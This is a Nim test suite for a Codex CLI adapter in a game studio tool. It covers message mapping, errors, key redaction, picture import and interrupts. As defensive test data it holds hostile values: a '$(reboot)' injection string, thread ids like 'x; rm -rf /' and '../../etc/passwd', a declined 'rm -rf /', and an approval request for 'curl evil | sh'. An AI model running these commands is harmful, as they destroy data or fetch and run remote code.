# Tests for the Codex adapter behind `para studio`'s chat (tools/para/codexagent.nim, with the
# interface in tools/para/agent.nim):
#
# - the app-server conversation and the event mapping, from recorded messages
#   (tests/fixtures/codex-appserver/: trimmed copies of real runs of Codex CLI 0.159.2 - the three
#   answers of a start-up, a whole ordinary turn, a turn interrupted while a command ran) and from
#   hand-made messages written from that version's generated JSON schema for what this account
#   cannot produce (a plan with no usage left, a picture, an approval request, a helper);
# - the adapter against a stand-in `codex` (tests/fake_codex.nim, this program started again): the
#   command line and what is sent over standard input, resuming, a lost conversation, a crash,
#   output that is not JSON, a failed turn, a key that must never come back out, approval and
#   login-token requests that are always refused, a picture copied into the studio's folder, and a
#   polite stop (`turn/interrupt`) as well as the hard one.
#
# The real `codex` is run by hand in the PR's checklist, not here (it would use a plan).

import std/[unittest, os, strutils, json, tempfiles, times, sequtils]
import fake_codex
import tools/para/agent
import tools/para/codexagent
import tools/para/studioshot

when isMainModule:
  if getEnv("PARA_FAKE_CODEX") == "1":
    fakeCodexMain()

const fixtures = currentSourcePath.parentDir / "fixtures" / "codex-appserver"
const threadId = "01a166dd-e2b4-7ce0-97ad-2a5dada08c07"

proc fixtureLines(name: string): seq[string] =
  for line in lines(fixtures / name):
    if line.strip.len > 0: result.add line

proc ofKind(events: seq[UiEvent], k: UiKind): seq[UiEvent] =
  events.filterIt(it.kind == k)

proc parsed(lines: seq[string]): seq[JsonNode] =
  lines.mapIt(parseJson(it))

proc methods(lines: seq[JsonNode]): seq[string] =
  lines.mapIt(it{"method"}.getStr)

type Feed = object
  m: CodexMapper
  events: seq[UiEvent]
  sent: seq[JsonNode] ## everything the mapper wanted to send, in order

proc feed(f: var Feed, line: string) =
  f.events.add f.m.mapLine(line)
  f.sent.add f.m.takeOutbox().parsed

proc feed(f: var Feed, lines: seq[string]) =
  for l in lines: f.feed(l)

proc started(text = "hello", resumeId = "", root = "/work/repo"): Feed =
  result.m = newCodexMapper(root, text, resumeId)
  result.sent.add result.m.begin().parsed
  result.feed(fixtureLines("handshake.jsonl"))

proc note(meth: string, params: JsonNode): string =
  $(%*{"method": meth, "params": params})

proc itemNote(meth: string, item: JsonNode, thread = threadId): string =
  note(meth, %*{"item": item, "threadId": thread, "turnId": "t1"})

proc completedTurn(status = "completed", error: JsonNode = newJNull()): string =
  note("turn/completed", %*{"threadId": threadId, "turn": {"id": "t1", "items": [], "status": status, "error": error}})

suite "codex conversation: what is sent, from the first line to the turn":
  test "a new conversation: initialize, initialized, thread/start, then the message inside JSON":
    var f = started("make it red; $(reboot) \"quoted\" & `x` | y\nsecond line ünïcode")
    check f.sent.methods == @["initialize", "initialized", "thread/start", "turn/start"]
    check f.sent[0]["params"]["clientInfo"]["name"].getStr == "para-studio"
    let start = f.sent[2]["params"]
    check start["cwd"].getStr == "/work/repo"
    check start["approvalPolicy"].getStr == "never" and start["sandbox"].getStr == "workspace-write"
    check not start.hasKey("threadId")
    let turn = f.sent[3]["params"]
    check turn["threadId"].getStr == threadId
    check turn["input"][0]["type"].getStr == "text"
    check turn["input"][0]["text"].getStr == "make it red; $(reboot) \"quoted\" & `x` | y\nsecond line ünïcode"
    check f.m.sessionId == threadId and f.m.version == "0.159.2" and f.m.sawInit
    check f.events.len == 0
    # requests are numbered and answered in turn
    check f.sent.filterIt(it.hasKey("id")).mapIt(it["id"].getInt) == @[1, 2, 3]

  test "a later turn resumes the thread, without its history":
    var f = started("again", resumeId = threadId)
    check f.sent.methods == @["initialize", "initialized", "thread/resume", "turn/start"]
    let resume = f.sent[2]["params"]
    check resume["threadId"].getStr == threadId and resume["excludeTurns"].getBool
    check resume["approvalPolicy"].getStr == "never" and resume["sandbox"].getStr == "workspace-write"

  test "a thread id that is not a UUID is not resumed":
    for bad in ["", "abc", threadId & "0", "x; rm -rf /", "../../etc/passwd", "--dangerously-bypass-approvals-and-sandbox"]:
      var f = started("hi", resumeId = bad)
      check "thread/resume" notin f.sent.methods and "thread/start" in f.sent.methods
    check validThread(threadId) == threadId and validThread("not-a-uuid") == ""

  test "a lost conversation (the resume is refused) is not an error to show; the adapter starts a new one":
    var f: Feed
    f.m = newCodexMapper("/work/repo", "hi", threadId)
    discard f.m.begin()
    f.feed(fixtureLines("handshake.jsonl")[0])
    f.feed("""{"id":2,"error":{"code":-32600,"message":"no rollout found for thread id 01a166dd"}}""")
    check f.m.sessionMissing and f.events.len == 0
    check f.m.finish(0, false).len == 0

  test "a resume that fails for another reason (signed out) is shown, not taken for a lost conversation":
    var f: Feed
    f.m = newCodexMapper("/work/repo", "hi", threadId)
    discard f.m.begin()
    f.feed(fixtureLines("handshake.jsonl")[0])
    f.feed("""{"id":2,"error":{"code":-32603,"message":"not logged in: please log in again"}}""")
    check not f.m.sessionMissing
    check f.events.ofKind(ukError).mapIt(it.code) == @["not-signed-in"]

  test "a start-up that fails says so once, in plain words":
    var f: Feed
    f.m = newCodexMapper("/work/repo", "hi")
    discard f.m.begin()
    f.feed("""{"id":1,"error":{"code":-32603,"message":"not logged in: please log in again"}}""")
    check f.events.ofKind(ukError).mapIt(it.code) == @["not-signed-in"]
    check f.m.finish(1, false).len == 0 # told already

suite "codex events: what recorded runs turn into":
  test "an ordinary turn: the producer's words come through, hooks and reasoning do not":
    var f = started()
    f.feed(fixtureLines("turn_ok.jsonl"))
    check f.m.completed and f.m.status == "completed" and f.m.turnId == "01a166dd-e2ec-7b32-9e93-9d08745e8393"
    let says = f.events.ofKind(ukSay)
    check says.len == 2
    check says[0].text.startsWith("Captain, I’ll check the available tool names")
    check says[1].text.startsWith("apply_patch, clock__curr_time")
    check f.events.len == 2 # nothing else: the usage window at 18 percent is not worth a word
    check f.m.finish(0, false).len == 0

  test "an interrupted turn ends quietly, with the command shown without its shell wrapper":
    var f = started()
    f.feed(fixtureLines("interrupt_pre.jsonl"))
    let lines = f.events.ofKind(ukActivity)
    check lines.mapIt(it.text) == @["Running: sleep 25"]
    check f.events.ofKind(ukSay).len == 1 and f.events.ofKind(ukSay)[0].text.startsWith("Captain, I’ll run exactly")
    check not f.m.completed and f.m.turnId == "01a166de-ae58-7193-954f-42225317d8cd"
    f.feed(fixtureLines("interrupt_post.jsonl"))
    check f.m.completed and f.m.status == "interrupted"
    check f.events.ofKind(ukError).len == 0
    check f.m.finish(0, true).len == 0

  test "the polite stop names the thread and the turn":
    let line = parseJson(interruptLine(threadId, "turn-9"))
    check line["method"].getStr == "turn/interrupt"
    check line["params"]["threadId"].getStr == threadId and line["params"]["turnId"].getStr == "turn-9"

  test "shell wrappers come off a command, nothing else does":
    check plainCommand("/usr/bin/bash -lc 'ls -la games'") == "ls -la games"
    check plainCommand("bash -lc \"echo hi && pwd\"") == "echo hi && pwd"
    check plainCommand("C:\\Program Files\\Git\\bin\\bash.exe -c 'nim c x.nim'") == "nim c x.nim"
    check plainCommand("tmp/para check --game pong") == "tmp/para check --game pong"
    check plainCommand("python -c 'print(1)'") == "python -c 'print(1)'"

suite "codex events: items the recorded runs did not contain":
  test "a command or a file change that was declined is told once, in plain words":
    var f = started()
    let cmd = %*{"type": "commandExecution", "id": "c1", "command": "/usr/bin/bash -lc 'rm -rf /'", "commandActions": [],
                 "cwd": "/work/repo", "status": "declined"}
    f.feed(itemNote("item/started", cmd))
    f.feed(itemNote("item/completed", cmd))
    f.feed(itemNote("item/completed", cmd))
    let refused = f.events.ofKind(ukRefused)
    check refused.len == 1
    check refused[0].text == "The producer wasn't allowed to run `rm -rf /`. Ask the producer to do it a different way."
    let patch = %*{"type": "fileChange", "id": "p1", "status": "declined",
                   "changes": [{"path": "/work/repo/games/pong/data.nim", "kind": {"type": "update"}, "diff": "x"}]}
    f.feed(itemNote("item/completed", patch))
    check f.events.ofKind(ukRefused).len == 2
    check "change games/pong/data.nim" in f.events.ofKind(ukRefused)[1].text
    check f.events.ofKind(ukActivity).mapIt(it.text) == @["Running: rm -rf /", "Changing games/pong/data.nim"]

  test "a file change that only names its files when it completes still gets its line":
    var f = started()
    f.feed(itemNote("item/started", %*{"type": "fileChange", "id": "p1", "status": "inProgress", "changes": []}))
    check f.events.len == 0
    f.feed(itemNote("item/completed", %*{"type": "fileChange", "id": "p1", "status": "completed",
      "changes": [{"path": "/work/repo/a.nim", "kind": {"type": "add"}, "diff": ""}, {"path": "/work/repo/b.nim", "kind": {"type": "add"}, "diff": ""}]}))
    check f.events.ofKind(ukActivity).mapIt(it.text) == @["Changing a.nim", "Changing b.nim"]

  test "searches and tool calls become light lines; reasoning and the friend's own message do not":
    var f = started()
    f.feed(itemNote("item/started", %*{"type": "webSearch", "id": "w1", "query": "pixel art"}))
    f.feed(itemNote("item/started", %*{"type": "mcpToolCall", "id": "m1", "server": "x", "tool": "lookup", "arguments": {}, "status": "inProgress"}))
    f.feed(itemNote("item/started", %*{"type": "reasoning", "id": "r1", "summary": [], "content": []}))
    f.feed(itemNote("item/started", %*{"type": "userMessage", "id": "u1", "content": []}))
    check f.events.mapIt(it.text) == @["Looking something up online", "Using lookup"]

  test "what a helper's own thread does is not the producer's business":
    var f = started()
    f.feed(itemNote("item/completed", %*{"type": "agentMessage", "id": "a", "text": "inner chatter", "phase": "final_answer"}, thread = "other-thread"))
    f.feed(itemNote("item/started", %*{"type": "commandExecution", "id": "c", "command": "ls", "status": "inProgress"}, thread = "other-thread"))
    check f.events.len == 0

  test "helpers become one card each: started, working with a count, done with their last words":
    var f = started()
    let prompt = "Read .agents/skills/builder/SKILL.md and add a crown to the title screen"
    f.feed(itemNote("item/started", %*{"type": "collabAgentToolCall", "id": "call1", "tool": "spawnAgent", "status": "inProgress",
      "senderThreadId": threadId, "receiverThreadIds": [], "prompt": prompt, "agentsStates": {}}))
    f.feed(itemNote("item/completed", %*{"type": "collabAgentToolCall", "id": "call1", "tool": "spawnAgent", "status": "completed",
      "senderThreadId": threadId, "receiverThreadIds": ["helper-1"], "prompt": prompt,
      "agentsStates": {"helper-1": {"status": "running", "message": nil}}}))
    f.feed(itemNote("item/completed", %*{"type": "subAgentActivity", "id": "s1", "agentPath": "root/helper", "agentThreadId": "helper-1", "kind": "toolCall"}))
    f.feed(itemNote("item/completed", %*{"type": "subAgentActivity", "id": "s2", "agentPath": "root/helper", "agentThreadId": "helper-1", "kind": "toolCall"}))
    f.feed(itemNote("item/completed", %*{"type": "collabAgentToolCall", "id": "call2", "tool": "wait", "status": "completed",
      "senderThreadId": threadId, "receiverThreadIds": ["helper-1"],
      "agentsStates": {"helper-1": {"status": "completed", "message": "Crown added to the title screen."}}}))
    f.feed(itemNote("item/completed", %*{"type": "collabAgentToolCall", "id": "call3", "tool": "wait", "status": "completed",
      "senderThreadId": threadId, "receiverThreadIds": ["helper-1"],
      "agentsStates": {"helper-1": {"status": "completed", "message": "again"}}}))
    let cards = f.events.ofKind(ukHelper)
    check cards.mapIt(it.status) == @["started", "working", "working", "working", "done"]
    check cards.mapIt(it.id).deduplicate == @["call1"]
    check cards.mapIt(it.role).deduplicate == @["builder"]
    check cards[0].text.startsWith("Read .agents/skills/builder/SKILL.md")
    check cards.mapIt(it.tools) == @[0, 0, 1, 2, 2]
    check cards[4].text == "Crown added to the title screen."

  test "a helper that errors or is shut down closes its card":
    var f = started()
    for (n, state, status) in [(1, "errored", "failed"), (2, "shutdown", "stopped")]:
      let call = "call" & $n
      f.feed(itemNote("item/completed", %*{"type": "collabAgentToolCall", "id": call, "tool": "spawnAgent", "status": "completed",
        "senderThreadId": threadId, "receiverThreadIds": ["h" & $n], "prompt": "do it",
        "agentsStates": {("h" & $n): {"status": state, "message": "x"}}}))
      check f.events.ofKind(ukHelper)[^1].status == status
      check f.events.ofKind(ukHelper)[^1].role == "helper"

  test "a plan that is nearly used up is said once, with when it resets":
    var f = started()
    let limits = %*{"rateLimits": {"limitId": "codex", "primary": {"usedPercent": 93, "windowDurationMins": 300, "resetsAt": 1795035963}, "secondary": nil}}
    f.feed(note("account/rateLimits/updated", limits))
    f.feed(note("account/rateLimits/updated", limits))
    let notes = f.events.ofKind(ukNotice)
    check notes.len == 1 and notes[0].code == "limit-near"
    check "93%" in notes[0].text and "resets on " in notes[0].text

suite "codex events: how a failed turn is worded":
  proc failure(info: JsonNode, message: string): tuple[events: seq[UiEvent], m: CodexMapper] =
    var f = started()
    f.feed(completedTurn("failed", %*{"message": message, "codexErrorInfo": info}))
    (f.events, f.m)

  test "each of Codex's own words becomes a stable code the page can act on":
    let cases = [("unauthorized", "no", "not-signed-in"), ("usageLimitExceeded", "no", "no-credit"),
                 ("rateLimitExceeded", "no", "busy"), ("serverOverloaded", "no", "busy"),
                 ("contextWindowExceeded", "no", "conversation-full"), ("sandboxError", "no", "agent-error"),
                 ("other", "no", "agent-error")]
    for (info, message, code) in cases:
      var (events, m) = failure(%info, message)
      check events.ofKind(ukError).mapIt(it.code) == @[code]
      check m.status == "failed" and m.completed
      check m.finish(0, false).len == 0 # told already, once
    let (events, _) = failure(%*{"httpConnectionFailed": {"httpStatusCode": 502}}, "boom")
    check events.ofKind(ukError)[0].code == "agent-error"

  test "no usage left says when the window resets, from the last usage update, and never offers to retry":
    var f = started()
    f.feed(note("account/rateLimits/updated", %*{"rateLimits": {"primary": {"usedPercent": 100, "resetsAt": 1795035963}}}))
    f.feed(completedTurn("failed", %*{"message": "You've hit your usage limit.", "codexErrorInfo": "usageLimitExceeded"}))
    let err = f.events.ofKind(ukError)[0]
    check err.code == "no-credit" and "plan resets on " in err.text
    check "retry" notin err.text.toLowerAscii

  test "the error notification before a bare failed turn still tells what happened":
    var f = started()
    f.feed(note("error", %*{"threadId": threadId, "turnId": "t1", "willRetry": true, "error": {"message": "stream hiccup", "codexErrorInfo": "other"}}))
    f.feed(note("error", %*{"threadId": threadId, "turnId": "t1", "willRetry": false, "error": {"message": "Too many requests", "codexErrorInfo": "rateLimitExceeded"}}))
    f.feed(note("turn/completed", %*{"threadId": threadId, "turn": {"id": "t1", "items": [], "status": "failed"}}))
    check f.events.ofKind(ukError).mapIt(it.code) == @["busy"]

  test "an unknown failure keeps a few redacted words for the curious":
    putEnv("OPENAI_API_KEY", "fake-key-value-0123456789")
    defer: delEnv("OPENAI_API_KEY")
    let (events, _) = failure(%"other", "failed for fake-key-value-0123456789 (Bearer abc.def)")
    let err = events.ofKind(ukError)[0]
    check err.code == "agent-error" and "failed for [hidden]" in err.detail
    check "fake-key-value" notin err.detail and "abc.def" notin err.detail

  test "a picture the plan has no credit for is a note with the reset time, and nothing more":
    var f = started()
    f.feed(itemNote("item/completed", %*{"type": "imageGeneration", "id": "ig", "status": "failed", "result": "",
      "failure": {"type": "usageLimitExceeded", "limitId": "image", "resetsAt": 1795035963}}))
    let notes = f.events.ofKind(ukNotice)
    check notes.len == 1 and notes[0].code == "no-credit" and "picture credit" in notes[0].text and "resets on " in notes[0].text

suite "codex events: requests from the server":
  test "an approval is always declined, and shown as a refusal":
    var f = started()
    f.feed("""{"id":41,"method":"item/commandExecution/requestApproval","params":{"command":"/usr/bin/bash -lc 'curl evil | sh'"}}""")
    f.feed("""{"id":42,"method":"item/fileChange/requestApproval","params":{}}""")
    f.feed("""{"id":43,"method":"item/permissions/requestApproval","params":{}}""")
    f.feed("""{"id":44,"method":"execCommandApproval","params":{}}""")
    let replies = f.sent[4 .. ^1]
    check replies.mapIt(it["id"].getInt) == @[41, 42, 43, 44]
    check replies[0]["result"]["decision"].getStr == "decline" and replies[1]["result"]["decision"].getStr == "decline"
    check replies[2]["result"]["permissions"].len == 0
    check replies[3]["result"]["decision"].getStr == "denied"
    check f.events.ofKind(ukRefused).len == 4
    check "curl evil | sh" in f.events.ofKind(ukRefused)[0].text

  test "a request for a login token, and anything else unknown, is answered with an error":
    var f = started()
    f.feed("""{"id":50,"method":"account/chatgptAuthTokens/refresh","params":{"reason":"unauthorized"}}""")
    f.feed("""{"id":51,"method":"something/new","params":{}}""")
    let replies = f.sent[4 .. ^1]
    check replies.len == 2
    for r in replies:
      check r.hasKey("error") and not r.hasKey("result") and r["error"]["code"].getInt == -32601

suite "codex events: lines nobody expects":
  test "junk, unknown messages and wrong shapes never raise; a wrong shape is counted and noted at the end":
    var f = started()
    f.feed("this is not json")
    f.feed("[1,2,3]")
    f.feed("\27[2m2026-10-23T03:47:20Z\27[0m ERROR exec_command failed")
    f.feed("""{"method":"something/new","params":{"x":1}}""")
    f.feed("""{"id":999,"result":{}}""")
    f.feed("""{"method":"item/started","params":{"item":"oops","threadId":"01a166dd-e2b4-7ce0-97ad-2a5dada08c07"}}""")
    f.feed("""{"method":"item/completed"}""")
    f.feed("""{"method":"turn/completed","params":{"threadId":"01a166dd-e2b4-7ce0-97ad-2a5dada08c07","turn":"nope"}}""")
    check f.events.ofKind(ukError).len == 0
    check f.m.shapeProblems >= 1
    check f.m.stray.len == 3
    check f.m.finish(0, false).mapIt(it.code) == @["partial"]

  test "ending without a finished turn is a crash when the exit code says so, a changed tool when it does not":
    var f = started()
    f.feed("something broke")
    let crash = f.m.finish(3, false)
    check crash.len == 1 and crash[0].code == "crashed" and "exit code 3" in crash[0].text and crash[0].detail == "something broke"
    var g = started()
    let changed = g.m.finish(0, false)
    check changed.len == 1 and changed[0].code == "tool-changed"

# --- the adapter against the stand-in -------------------------------------------------

var scratch: string
var logPath: string
let startDir = getCurrentDir() # a turn leaves this process in the folder it ran in; go back before deleting it

proc begin(mode: string, fixtureName = "turn_ok.jsonl") =
  scratch = createTempDir("para_codex_", "")
  logPath = scratch / "fake.log"
  putEnv("PARA_FAKE_CODEX", "1")
  putEnv("FAKE_CODEX_MODE", mode)
  putEnv("FAKE_CODEX_FIXTURE", fixtureName)
  putEnv("FAKE_CODEX_LOG", logPath)

proc finish() =
  for k in ["PARA_FAKE_CODEX", "FAKE_CODEX_MODE", "FAKE_CODEX_FIXTURE", "FAKE_CODEX_LOG", "FAKE_CODEX_PIDFILE",
            "FAKE_CODEX_HOME", "FAKE_CODEX_SAVED", "OPENAI_API_KEY"]:
    delEnv(k)
  setCurrentDir(startDir)
  removeDir(scratch)

type Collected = ref object
  events: seq[UiEvent]
  sessions: seq[string]

proc fakeAdapter(): AgentAdapter = newCodexAdapter(getAppFilename())

proc runTurn(a: AgentAdapter, text: string, session = "", ctl: ptr TurnControl = nil): tuple[res: TurnResult, got: Collected] =
  let c = if ctl.isNil: newTurnControl() else: ctl
  var got = Collected()
  let req = TurnRequest(text: text, sessionId: session, workDir: scratch,
                        onSession: proc (id: string) {.closure, gcsafe.} = {.cast(gcsafe).}: got.sessions.add id)
  let res = a.runTurn(a, req, c, proc (ev: UiEvent) {.closure, gcsafe.} = {.cast(gcsafe).}: got.events.add ev)
  (res, got)

proc logged(): seq[JsonNode] =
  for line in lines(logPath): result.add parseJson(line)

proc sentMethods(entries: seq[JsonNode]): seq[string] =
  entries.filterIt(it.hasKey("method") and it["method"].kind == JString).mapIt(it["method"].getStr)

suite "codex adapter: a turn against a stand-in codex":
  teardown: finish()

  test "a normal turn: events, the thread id, and exactly what is on the command line":
    begin("normal")
    let message = "make it red; $(reboot) \"quoted\" & `x` | y\nsecond line ünïcode"
    let (res, got) = runTurn(fakeAdapter(), message)
    check res.ok and not res.cancelled and res.exitCode == 0
    check res.sessionId == threadId and got.sessions == @[threadId]
    check got.events.ofKind(ukSay).len == 2
    check got.events.ofKind(ukError).len == 0
    let calls = logged()
    check calls[0]["args"].getElems.mapIt(it.getStr) == @["app-server", "--listen", "stdio://"]
    check calls[0]["ui"].getStr == "studio"
    check calls[0]["cwd"].getStr.expandFilename == scratch.expandFilename
    check calls[1 .. ^1].sentMethods == @["initialize", "initialized", "thread/start", "turn/start"]
    let turn = calls.filterIt(it{"method"}.getStr == "turn/start")[0]
    check turn["params"]["input"][0]["text"].getStr == message # the message travels inside JSON, whole
    for a in calls[0]["args"]:
      check message notin a.getStr and "danger" notin a.getStr and "bypass" notin a.getStr
    for c in calls[1 .. ^1]:
      check "danger-full-access" notin $c and "acceptForSession" notin $c

  test "a later turn resumes the thread; an id that is not a UUID starts a new one":
    begin("normal")
    let a = fakeAdapter()
    discard runTurn(a, "one", threadId)
    discard runTurn(a, "two", "x; rm -rf /")
    let calls = logged()
    check "thread/resume" in calls.sentMethods and calls.sentMethods.count("thread/start") == 1
    let resume = calls.filterIt(it{"method"}.getStr == "thread/resume")[0]
    check resume["params"]["threadId"].getStr == threadId

  test "the rest of the environment passes through unchanged":
    begin("normal")
    putEnv("PARALOOP_UI", "terminal") # the studio sets its own value
    defer: delEnv("PARALOOP_UI")
    discard runTurn(fakeAdapter(), "hi")
    check logged()[0]["ui"].getStr == "studio"
    check getEnv("PARALOOP_UI") == "terminal" # our own environment is untouched

  test "a lost conversation starts a fresh one once, and says so":
    begin("resume-missing")
    let (res, got) = runTurn(fakeAdapter(), "hi", threadId)
    check res.ok
    check got.events.ofKind(ukNotice).mapIt(it.code) == @["fresh-start"]
    check got.events.ofKind(ukError).len == 0
    check got.events.ofKind(ukSay).len == 2
    let calls = logged().filterIt(it.hasKey("method"))
    check calls.sentMethods.count("initialize") == 2 # two processes
    check calls.sentMethods.count("thread/resume") == 1 and calls.sentMethods.count("thread/start") == 1
    check res.sessionId == threadId

  test "a non-zero exit before the turn ends is a plain message":
    begin("crash")
    let (res, got) = runTurn(fakeAdapter(), "hi")
    check not res.ok and res.exitCode == 3
    let errs = got.events.ofKind(ukError)
    check errs.len == 1 and errs[0].code == "crashed" and "exit code 3" in errs[0].text
    check errs[0].detail == "codex: something broke"

  test "output that is not JSON says the tool changed":
    begin("garbage")
    let (res, got) = runTurn(fakeAdapter(), "hi")
    check not res.ok
    check got.events.ofKind(ukError).mapIt(it.code) == @["tool-changed"]

  test "a plan with no usage left is shown as it is; the turn is not run again":
    begin("normal", "usage_limit.jsonl")
    let (res, got) = runTurn(fakeAdapter(), "hi")
    check not res.ok
    check got.events.ofKind(ukError).mapIt(it.code) == @["no-credit"]
    check got.events.ofKind(ukNotice).mapIt(it.code) == @["limit-near"]
    check logged().sentMethods.count("turn/start") == 1

  test "a key in the child's environment never comes back out in any event":
    begin("secret")
    let key = "sk-FAKEKEY-0123456789abcdef"
    putEnv("OPENAI_API_KEY", key)
    let (res, got) = runTurn(fakeAdapter(), "hi")
    check not res.ok
    check got.events.len > 0
    for ev in got.events:
      for field in [ev.text, ev.detail, ev.id, ev.role, ev.code, ev.url]:
        check key notin field and "0123456789abcdef" notin field
    check got.events.ofKind(ukError).len == 1

  test "approvals and login-token requests are refused, whatever the server asks":
    begin("approval", "approved.jsonl")
    let (res, got) = runTurn(fakeAdapter(), "hi")
    check res.ok
    check got.events.ofKind(ukRefused).len == 1 and "rm -rf /" in got.events.ofKind(ukRefused)[0].text
    let answers = logged().filterIt(not it.hasKey("method") and it.hasKey("id"))
    check answers.len == 2
    check answers[0]["id"].getInt == 77 and answers[0]["result"]["decision"].getStr == "decline"
    check answers[1]["id"].getInt == 78 and answers[1].hasKey("error") and not answers[1].hasKey("result")

  test "codex not on the path: plain install help, nothing run":
    begin("normal")
    let oldPath = getEnv("PATH")
    putEnv("PATH", scratch) # a folder with no codex in it
    defer: putEnv("PATH", oldPath)
    let a = newCodexAdapter() # looks codex up on PATH
    let info = a.describe(a)
    check not info.installed and info.version == "" and info.label == "Codex"
    check "OpenAI's page" in info.note and "Windows" in info.note
    let (res, got) = runTurn(a, "hi")
    check not res.ok
    let errs = got.events.ofKind(ukError)
    check errs.len == 1 and errs[0].code == "not-installed" and errs[0].url == info.url
    check not fileExists(logPath)

  test "a program that cannot be started is a plain error":
    begin("normal")
    let (res, got) = runTurn(newCodexAdapter(scratch / "no-such-codex"), "hi")
    check not res.ok
    check got.events.ofKind(ukError).mapIt(it.code) == @["cannot-start"]

  test "the version is read from codex --version, and a version that cannot be read is a note":
    begin("normal")
    let info = fakeAdapter().describe(fakeAdapter())
    check info.installed and info.version == "0.159.2" and info.note == "" and info.name == "codex"
    putEnv("FAKE_CODEX_MODE", "noversion")
    let odd = fakeAdapter().describe(fakeAdapter())
    check odd.installed and odd.version == "" and "couldn't read Codex's version" in odd.note
    check fakeAdapter().cost.len > 0 and "Plus" in fakeAdapter().about and "Claude stays the default" in fakeAdapter().about

  test "a picture the model made is copied into the studio's folder and shown as a card":
    begin("normal", "image.jsonl")
    let home = scratch / "codexhome"
    let saved = home / "generated_images" / threadId / "ig_1.png"
    createDir(saved.parentDir)
    writeFile(saved, "\x89PNG\r\n\x1a\n" & "not really a picture, but it starts like one")
    putEnv("FAKE_CODEX_HOME", home)
    putEnv("FAKE_CODEX_SAVED", saved)
    let (res, got) = runTurn(fakeAdapter(), "make a crown")
    check res.ok
    let shots = got.events.ofKind(ukShot)
    check shots.len == 1 and validShotName(shots[0].text)
    check fileExists(shotsDir(scratch) / shots[0].text)
    check readShot(scratch, shots[0].text).startsWith("\x89PNG")
    check fileExists(saved) # copied, not moved: the file is Codex's
    check got.events.ofKind(ukActivity).mapIt(it.text) == @["Making a picture"]

  test "a picture named outside codex's own folder, or one that is not a PNG, is left alone":
    begin("normal", "image.jsonl")
    let home = scratch / "codexhome"
    createDir(home / "generated_images")
    let outside = scratch / "secret.png"
    writeFile(outside, "\x89PNG\r\n\x1a\n" & "outside")
    putEnv("FAKE_CODEX_HOME", home)
    putEnv("FAKE_CODEX_SAVED", outside)
    let (_, got) = runTurn(fakeAdapter(), "make a crown")
    check got.events.ofKind(ukShot).len == 0
    check got.events.ofKind(ukNotice).mapIt(it.code) == @["picture-not-shown"]
    check not dirExists(shotsDir(scratch))
    let fake = home / "generated_images" / "x.png"
    writeFile(fake, "<html>not a png</html>")
    putEnv("FAKE_CODEX_SAVED", fake)
    let (_, got2) = runTurn(fakeAdapter(), "make a crown")
    check got2.events.ofKind(ukShot).len == 0 and got2.events.ofKind(ukNotice).mapIt(it.code) == @["picture-not-shown"]

suite "importPicture: the studio's own checks on a picture an agent names":
  var dir: string
  setup: dir = createTempDir("para_import_", "")
  teardown: removeDir(dir)

  test "only an absolute .png inside the allowed folder, a plain PNG file, is copied":
    let allowed = dir / "gen"
    createDir(allowed / "t")
    let good = allowed / "t" / "a.png"
    writeFile(good, "\x89PNG\r\n\x1a\n" & "data")
    check importPicture(dir, good, allowed).ok
    for bad in ["", "a.png", allowed / "t" / "missing.png", allowed / ".." / "gen" / ".." / "x.png", dir / "x.png",
                good & "\n", allowed, allowed / "t" / "a.txt"]:
      check not importPicture(dir, bad, allowed).ok
    check not importPicture(dir, good, "").ok

  test "a link, a file that is not a PNG and a file that is too small are refused":
    let allowed = dir / "gen"
    createDir(allowed)
    writeFile(allowed / "text.png", "just words, not a picture")
    writeFile(allowed / "tiny.png", "\x89PNG")
    check not importPicture(dir, allowed / "text.png", allowed).ok
    check not importPicture(dir, allowed / "tiny.png", allowed).ok
    when not defined(windows):
      writeFile(dir / "elsewhere.png", "\x89PNG\r\n\x1a\n" & "data")
      createSymlink(dir / "elsewhere.png", allowed / "link.png")
      check not importPicture(dir, allowed / "link.png", allowed).ok

# --- stopping a turn ------------------------------------------------------------------

suite "codex adapter: stopping a turn":
  teardown: finish()

  proc alive(pid: int): bool =
    when defined(linux):
      try:
        let stat = readFile("/proc/" & $pid & "/stat")
        let state = stat[stat.rfind(')') + 2]
        return state notin {'Z', 'X'}
      except IOError, OSError:
        return false
    else:
      return false

  type Job = object
    adapter: AgentAdapter
    ctl: ptr TurnControl
    done: ptr bool
    cancelled: ptr bool

  var jobThread: Thread[ptr Job]
  var gotEvents: seq[UiEvent]

  proc jobMain(j: ptr Job) {.thread.} =
    {.cast(gcsafe).}:
      let req = TurnRequest(text: "go", workDir: scratch)
      let res = j.adapter.runTurn(j.adapter, req, j.ctl, proc (ev: UiEvent) {.closure, gcsafe.} = {.cast(gcsafe).}: gotEvents.add ev)
      j.cancelled[] = res.cancelled
      j.done[] = true

  proc waitFor(cond: proc (): bool, seconds = 20): bool =
    let until = epochTime() + seconds.float
    while not cond() and epochTime() < until: sleep(50)
    cond()

  test "a stop asks codex politely first: turn/interrupt, no signal needed":
    when defined(windows):
      skip()
    else:
      begin("interrupt", "interrupt_pre.jsonl")
      var done = false
      var cancelled = false
      let ctl = newTurnControl()
      var job = Job(adapter: fakeAdapter(), ctl: ctl, done: addr done, cancelled: addr cancelled)
      gotEvents = @[]
      createThread(jobThread, jobMain, addr job)
      check waitFor(proc (): bool = {.cast(gcsafe).}: gotEvents.anyIt(it.kind == ukActivity))
      let t0 = epochTime()
      ctl.cancel("stop")
      joinThread(jobThread)
      check epochTime() - t0 < 1.5 # answered in milliseconds, so the 2 second grace was not used
      check done and cancelled
      let interrupts = logged().filterIt(it{"method"}.getStr == "turn/interrupt")
      check interrupts.len == 1
      check interrupts[0]["params"]["threadId"].getStr == threadId
      check interrupts[0]["params"]["turnId"].getStr == "01a166de-ae58-7193-954f-42225317d8cd"
      check gotEvents.ofKind(ukError).len == 0 # a stop we asked for is not an error
      freeTurnControl(ctl)

  test "a codex that ignores the polite stop is ended with its whole tree":
    when defined(windows):
      skip()
    else:
      begin("deaf", "interrupt_pre.jsonl")
      let pidFile = scratch / "pids.txt"
      putEnv("FAKE_CODEX_PIDFILE", pidFile)
      var done = false
      var cancelled = false
      let ctl = newTurnControl()
      var job = Job(adapter: fakeAdapter(), ctl: ctl, done: addr done, cancelled: addr cancelled)
      gotEvents = @[]
      createThread(jobThread, jobMain, addr job)
      check waitFor(proc (): bool = fileExists(pidFile))
      check waitFor(proc (): bool = {.cast(gcsafe).}: gotEvents.anyIt(it.kind == ukActivity)) # the turn is under way
      let pids = readFile(pidFile).split(' ').mapIt(parseInt(it))
      let grandchild = pids[0]
      let child = pids[1]
      check alive(child) and alive(grandchild)
      let t0 = epochTime()
      ctl.cancel("stop")
      joinThread(jobThread)
      check epochTime() - t0 < 10
      check done and cancelled
